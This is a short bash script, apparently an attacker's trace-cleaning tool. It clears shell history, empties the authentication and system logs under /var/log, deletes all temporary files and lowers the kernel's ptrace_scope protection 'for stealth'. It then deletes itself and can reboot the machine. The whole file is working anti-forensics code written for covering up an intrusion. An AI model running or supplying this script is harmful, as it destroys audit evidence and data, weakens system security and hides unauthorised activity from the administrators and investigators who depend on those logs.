#!/bin/bash

echo "[*] Do you want to clear all logs and traces from this system? (y/n)"
read -r answer

if [[ "$answer" =~ ^[Yy]$ ]]; then
    echo "[+] Clearing bash history..."
    unset HISTFILE
    history -c
    rm -f ~/.bash_history

    echo "[+] Wiping logs..."
    LOGS=(
      /var/log/wtmp
      /var/log/btmp
      /var/log/lastlog
      /var/log/auth.log
      /var/log/syslog
      /var/log/messages
      /var/log/user.log
    )

    for log in "${LOGS[@]}"; do
      if [ -f "$log" ]; then
        > "$log"
        echo "[+] Cleared: $log"
      fi
    done

    echo "[+] Cleaning temp files..."
    rm -rf /tmp/* /var/tmp/*

    echo "[+] Lowering ptrace_scope for stealth (optional)..."
    echo 0 > /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
else
    echo "[*] No cleanup performed."
    exit
fi

# Ask for reboot
echo "[*] Do you want to reboot the system now? (y/n)"
read -r reboot_choice

SCRIPT_PATH=$(realpath "$0")

if [[ "$reboot_choice" =~ ^[Yy]$ ]]; then
    echo "[+] Removing script and rebooting..."
    
    rm -f "$SCRIPT_PATH"

    reboot
else
    echo "[*] Exiting without reboot."

    (sleep 2 && rm -f "$SCRIPT_PATH") &
    exit
fi
